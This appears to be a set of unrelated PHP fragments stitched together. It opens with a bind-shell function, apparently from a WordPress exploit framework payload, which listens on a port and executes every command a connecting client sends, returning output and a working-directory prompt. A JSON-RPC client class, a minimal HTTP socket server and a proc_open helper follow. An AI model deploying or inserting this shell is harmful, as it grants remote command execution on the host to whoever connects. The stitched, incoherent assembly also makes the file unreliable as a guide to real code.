function start_socket_server($port, $wpxf_disabled, $wpxf_exec)
{
    $scl = 'socket_create_listen';
    if (is_callable($scl) && !in_array($scl, $wpxf_disabled)) {
        $sock = @$scl($port);
    } else {
        $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $ret = @socket_bind($sock, 0, $port);
        $ret = @socket_listen($sock, 5);
    }

    $msg_sock = @socket_accept($sock);
    @socket_close($sock);

    $output = getcwd() . ' > ';
    @socket_write($msg_sock, $output, strlen($output));

    while (false !== @socket_select($r = array($msg_sock), $w = null, $e = null, null)) {
        $output = '';
        $cmd = @socket_read($msg_sock, 2048, PHP_NORMAL_READ);

        if (false === $cmd) {
            break;
        }
        if (substr($cmd, 0, 3) == 'cd ') {
            chdir(substr($cmd, 3, -1));
            $output = getcwd() . ' > ';
        } elseif (substr($cmd, 0, 4) == 'quit' || substr($cmd, 0, 4) == 'exit') {
            break;
        } else {
            if (false === strpos(strtolower(PHP_OS), 'win')) {
                $cmd = rtrim($cmd) . ' 2>&1';
            }

            $output = $wpxf_exec($cmd);
            $output .= getcwd() . ' > ';
        }

        @socket_write($msg_sock, $output, strlen($output));
    }

    @socket_close($msg_sock);
}

use Mix\Bean\BeanInjector;
use Mix\JsonRpc\Constants;
use Mix\JsonRpc\Exception\DeserializeException;
use Mix\JsonRpc\Helper\JsonRpcHelper;
use Mix\JsonRpc\Middleware\MiddlewareDispatcher;
use Mix\JsonRpc\Middleware\MiddlewareInterface;
use Mix\JsonRpc\Message\Request;
use Mix\JsonRpc\Message\Response;
use Swoole\Coroutine\Client;

class Connection
{
    public $host = '';
    public $port = 0;
    public $timeout = 0.0;
    public $callTimeout = 10.0;
    public $middleware = [];
    protected $client;

    public function __construct(array $config = [])
    {
        BeanInjector::inject($this, $config);
    }

    public function connect()
    {
        $host    = $this->host;
        $port    = $this->port;
        $timeout = $this->timeout;
        $client  = new Client(SWOOLE_SOCK_TCP);
        $client->set([
            'open_eof_check' => true,
            'package_eof'    => Constants::EOF,
        ]);
        if (!$client->connect($host, $port, $timeout)) {
            throw new \Swoole\Exception(sprintf("JSON-RPC: %s (host:%s, port: %s)", $client->errMsg, $host, $port), $client->errCode);
        }
        $this->client = $client;
    }

    public function call(Request $request)
    {
        $process              = function (Request $request) {
            $jsonString = JsonRpcHelper::encode($request) . Constants::EOF;
            $this->send($jsonString);
            $data = $this->recv($this->callTimeout);
            return JsonRpcHelper::deserializeResponse($data);
        };
        $middlewareDispatcher = new MiddlewareDispatcher($this->middleware, $process, $request);
        return $middlewareDispatcher->dispatch();
    }

    public function close()
    {
        if (!$this->client->close()) {
            $errMsg  = $this->client->errMsg;
            $errCode = $this->client->errCode;
            if ($errMsg == '' && $errCode == 0) {
                return;
            }
            throw new \Swoole\Exception($errMsg, $errCode);
        }
    }

    protected function recv(float $timeout = -1)
    {
        $data = $this->client->recv($timeout);
        if ($data === false) {
            $client = $this->client;
            throw new \Swoole\Exception($client->errMsg, $client->errCode);
        }
        if ($data === "") {
            $errCode = stripos(PHP_OS, 'Darwin') !== false ? 54 : 104;
            $errMsg  = swoole_strerror($errCode, 9);
            throw new \Swoole\Exception($errMsg, $errCode);
        }
        return $data;
    }

    protected function send(string $data)
    {
        $len  = strlen($data);
        $size = $this->client->send($data);
        if ($size === false) {
            throw new \Swoole\Exception($this->client->errMsg, $this->client->errCode);
        }
        if ($len !== $size) {
            throw new \Swoole\Exception('The sending data is incomplete, it may be that the socket has been closed by the peer.');
        }
    }
}

use Closure;
use Symfony\Component\Console\Output\OutputInterface;

class Server
{
    private string $host;
    private int $port;
    private OutputInterface $output;
    private bool $stop = false;
    private $socket;
    private array $clientSockets = [];
    private Closure $afterCallback;
    private Closure $tickerCallback;
    private Closure $routerCallback;

    public function __construct($host, $port, OutputInterface $output)
    {
        self::checkRequiredExtensionsExists();
        $this->host = $host;
        $this->port = $port;
        $this->output = $output;
    }

    public static function checkRequiredExtensionsExists(): void
    {
        if (!function_exists('socket_import_stream')) {
            throw new Exception('Required PHP extension "sockets" is not loaded');
        }
        if (!function_exists('stream_set_blocking')) {
            throw new Exception('Required PHP extension "stream" is not loaded');
        }
    }

    public function run(): void
    {
        try {
            $this->socket = $this->createServerSocket();
            $this->updatePort();
            if ($this->output->isDebug()) {
                $this->output->writeln("[master] Starting server at http://{$this->host}:{$this->port}");
            }

            ($this->afterCallback)($this->port);

            while (true) {
                $this->acceptNewConnections();
                $this->handleClientRequests();
                usleep(16_000);
                ($this->tickerCallback)();
                if ($this->stop) {
                    break;
                }
            }

            if ($this->output->isDebug()) {
                $this->output->writeln("[master] Stopping server at http://{$this->host}:{$this->port}");
            }
        } finally {
            if (isset($this->socket)) {
                fclose($this->socket);
            }
        }
    }

    private function createServerSocket()
    {
        $server = stream_socket_server("tcp://{$this->host}:{$this->port}", $errno, $errstr);
        if (!$server) {
            throw new Exception("Socket creation failed: $errstr ($errno)");
        }
        if (!stream_set_blocking($server, false)) {
            throw new Exception("Failed to set server socket to non-blocking mode");
        }
        return $server;
    }

    private function updatePort(): void
    {
        $name = stream_socket_get_name($this->socket, false);
        if ($name) {
            list(, $port) = explode(':', $name);
            $this->port = (int) $port;
        } else {
            throw new Exception("Failed to get the assigned port");
        }
    }

    private function acceptNewConnections(): void
    {
        $newClientSocket = @stream_socket_accept($this->socket, 0);
        if ($newClientSocket) {
            if (!stream_set_blocking($newClientSocket, false)) {
                throw new Exception("Failed to set client socket to non-blocking mode");
            }
            $this->clientSockets[] = $newClientSocket;
        }
    }

    private function handleClientRequests(): void
    {
        foreach ($this->clientSockets as $key => $clientSocket) {
            if (feof($clientSocket)) {
                $this->closeClientSocket($clientSocket, $key);
                continue;
            }

            $request = $this->readClientRequest($clientSocket);
            list($path, $payload) = $this->parseRequest($request);
            $response = ($this->routerCallback)($path, $payload);
            $this->sendResponse($clientSocket, $response);
            $this->closeClientSocket($clientSocket, $key);
        }
    }

    private function readClientRequest($clientSocket)
    {
        $request = '';
        while (($chunk = @fread($clientSocket, 1024)) !== false) {
            $request .= $chunk;
            if (strpos($request, "\r\n\r\n") !== false) {
                break;
            }
        }
        if ($chunk === false && !feof($clientSocket)) {
            throw new Exception("Socket read failed");
        }
        return $request;
    }

    private function parseRequest($request)
    {
        $lines = explode("\r\n", $request);
        $requestLine = $lines[0];
        $parts = explode(' ', $requestLine);
        if (count($parts) !== 3) {
            throw new Exception("Malformed request line: $requestLine");
        }
        $path = $parts[1];

        $headers = [];
        for ($i = 1; $i < count($lines); $i++) {
            $line = $lines[$i];
            if (empty($line)) {
                break;
            }
            [$key, $value] = explode(':', $line, 2);
            $headers[$key] = trim($value);
        }
        if (empty($headers['Content-Type']) || $headers['Content-Type'] !== 'application/json') {
            throw new Exception("Malformed request: invalid Content-Type");
        }

        $payload = json_decode(implode("\n", array_slice($lines, $i + 1)), true, flags: JSON_THROW_ON_ERROR);
        return [$path, $payload];
    }

    private function sendResponse($clientSocket, Response $response)
    {
        $code = $response->getStatus();
        $content = json_encode($response->getBody(), flags: JSON_PRETTY_PRINT);
        $headers = "HTTP/1.1 $code OK\r\n" .
            "Content-Type: application/json\r\n" .
            "Content-Length: " . strlen($content) . "\r\n" .
            "Connection: close\r\n\r\n";
        fwrite($clientSocket, $headers . $content);
    }

    private function closeClientSocket($clientSocket, $key): void
    {
        fclose($clientSocket);
        unset($this->clientSockets[$key]);
    }

    public function afterRun(Closure $param): void
    {
        $this->afterCallback = $param;
    }

    public function ticker(Closure $param): void
    {
        $this->tickerCallback = $param;
    }

    public function router(Closure $param)
    {
        $this->routerCallback = $param;
    }

    public function stop(): void
    {
        $this->stop = true;
    }
}

function readFromProcess(string|array $command): ?string
{
    if (!\function_exists('proc_open')) {
        return null;
    }

    $descriptorspec = [
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $cp = \function_exists('sapi_windows_cp_set') ? sapi_windows_cp_get() : 0;

    $process = proc_open($command, $descriptorspec, $pipes, null, null, ['suppress_errors' => true]);
    if (!\is_resource($process)) {
        return null;
    }

    $info = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    if ($cp) {
        sapi_windows_cp_set($cp);
    }

    return $info;
}

